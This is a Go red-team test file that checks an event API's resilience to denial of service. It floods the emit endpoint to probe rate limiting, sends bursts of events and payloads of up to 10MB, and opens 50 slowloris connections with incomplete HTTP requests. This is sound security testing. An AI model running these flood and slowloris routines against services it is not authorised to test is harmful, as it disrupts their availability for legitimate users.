//go:build redteam

package dos

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/filipexyz/notif/tests/redteam/exploits"
)

// TestRateLimitBypass tests if rate limiting is enforced
// NOTIF-004: Missing rate limiting
func TestRateLimitBypass(t *testing.T) {
	cfg := exploits.LoadConfig()
	if cfg.APIKey == "" {
		t.Skip("Requires REDTEAM_API_KEY")
	}

	const testDuration = 3 * time.Second

	var (
		successful int64
		limited    int64
		failed     int64
	)

	client := &http.Client{Timeout: 5 * time.Second}
	done := make(chan struct{})
	var wg sync.WaitGroup

	// Start workers
	for i := 0; i < 10; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-done:
					return
				default:
					payload := map[string]interface{}{
						"topic": "ratelimit.test",
						"data":  map[string]string{"test": "flood"},
					}
					body, _ := json.Marshal(payload)

					req, _ := http.NewRequest("POST", cfg.TargetURL+"/api/v1/emit", bytes.NewReader(body))
					req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
					req.Header.Set("Content-Type", "application/json")

					resp, err := client.Do(req)
					if err != nil {
						atomic.AddInt64(&failed, 1)
						continue
					}

					switch resp.StatusCode {
					case http.StatusOK, http.StatusCreated, http.StatusAccepted:
						atomic.AddInt64(&successful, 1)
					case http.StatusTooManyRequests:
						atomic.AddInt64(&limited, 1)
					default:
						atomic.AddInt64(&failed, 1)
					}
					resp.Body.Close()
				}
			}
		}()
	}

	// Run for test duration
	time.Sleep(testDuration)
	close(done)
	wg.Wait()

	t.Logf("Results: successful=%d, rate_limited=%d, failed=%d", successful, limited, failed)

	// If no requests were rate limited, vulnerability confirmed
	if limited == 0 && successful > 100 {
		t.Errorf("VULNERABLE: %d requests processed without any rate limiting", successful)
	}

	if limited > 0 {
		t.Logf("Rate limiting is working: %d requests were limited", limited)
	}
}

// TestEventFlood tests event emission flooding
func TestEventFlood(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping flood test in short mode")
	}

	cfg := exploits.LoadConfig()
	if cfg.APIKey == "" {
		t.Skip("Requires REDTEAM_API_KEY")
	}

	const totalEvents = 1000

	client := &http.Client{Timeout: 5 * time.Second}
	start := time.Now()

	var successful int64
	var wg sync.WaitGroup

	for i := 0; i < totalEvents; i++ {
		wg.Add(1)
		go func(idx int) {
			defer wg.Done()

			// Large payload
			payload := map[string]interface{}{
				"topic": "flood.test",
				"data": map[string]interface{}{
					"index":   idx,
					"padding": string(make([]byte, 10000)), // 10KB per event
				},
			}
			body, _ := json.Marshal(payload)

			req, _ := http.NewRequest("POST", cfg.TargetURL+"/api/v1/emit", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
			req.Header.Set("Content-Type", "application/json")

			resp, err := client.Do(req)
			if err == nil {
				if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusAccepted {
					atomic.AddInt64(&successful, 1)
				}
				resp.Body.Close()
			}
		}(i)
	}

	wg.Wait()
	duration := time.Since(start)

	t.Logf("Flood test: %d/%d events in %v (%.2f events/sec)",
		successful, totalEvents, duration, float64(successful)/duration.Seconds())

	if successful > 500 {
		t.Errorf("VULNERABLE: Server accepted %d flood events", successful)
	}
}

// TestLargePayload tests handling of oversized payloads
func TestLargePayload(t *testing.T) {
	cfg := exploits.LoadConfig()
	if cfg.APIKey == "" {
		t.Skip("Requires REDTEAM_API_KEY")
	}

	payloadSizes := []int{
		1024 * 100,       // 100KB
		1024 * 1024,      // 1MB
		1024 * 1024 * 5,  // 5MB
		1024 * 1024 * 10, // 10MB
	}

	client := &http.Client{Timeout: 30 * time.Second}

	for _, size := range payloadSizes {
		t.Run(formatSize(size), func(t *testing.T) {
			payload := map[string]interface{}{
				"topic": "large.payload",
				"data": map[string]interface{}{
					"padding": string(make([]byte, size)),
				},
			}
			body, _ := json.Marshal(payload)

			req, _ := http.NewRequest("POST", cfg.TargetURL+"/api/v1/emit", bytes.NewReader(body))
			req.Header.Set("Authorization", "Bearer "+cfg.APIKey)
			req.Header.Set("Content-Type", "application/json")

			resp, err := client.Do(req)
			if err != nil {
				t.Logf("Request failed (expected for large payloads): %v", err)
				return
			}
			defer resp.Body.Close()

			if resp.StatusCode == http.StatusOK || resp.StatusCode == http.StatusAccepted {
				t.Errorf("VULNERABLE: Server accepted %s payload", formatSize(size))
			} else {
				t.Logf("Rejected (good): %s payload returned %d", formatSize(size), resp.StatusCode)
			}
		})
	}
}

// TestSlowloris tests slow HTTP attack resilience
func TestSlowloris(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping slowloris test in short mode")
	}

	cfg := exploits.LoadConfig()

	const numConnections = 50

	// Extract host:port from URL
	host := strings.TrimPrefix(strings.TrimPrefix(cfg.TargetURL, "http://"), "https://")
	if !strings.Contains(host, ":") {
		host += ":80"
	}

	connections := make([]net.Conn, 0, numConnections)

	for i := 0; i < numConnections; i++ {
		conn, err := net.DialTimeout("tcp", host, 5*time.Second)
		if err != nil {
			t.Logf("Connection %d failed: %v", i, err)
			continue
		}

		// Send partial HTTP request
		conn.Write([]byte("POST /api/v1/emit HTTP/1.1\r\n"))
		conn.Write([]byte("Host: " + host + "\r\n"))
		conn.Write([]byte("Content-Type: application/json\r\n"))
		conn.Write([]byte("Content-Length: 1000000\r\n"))
		// Don't send \r\n\r\n to keep connection open

		connections = append(connections, conn)
	}

	t.Logf("Opened %d slowloris connections", len(connections))

	if len(connections) == numConnections {
		t.Error("VULNERABLE: Server allowed all slowloris connections")
	}

	// Keep connections alive for a bit
	time.Sleep(5 * time.Second)

	// Cleanup
	for _, conn := range connections {
		conn.Close()
	}
}

func formatSize(bytes int) string {
	if bytes >= 1024*1024 {
		return fmt.Sprintf("%dMB", bytes/1024/1024)
	}
	return fmt.Sprintf("%dKB", bytes/1024)
}
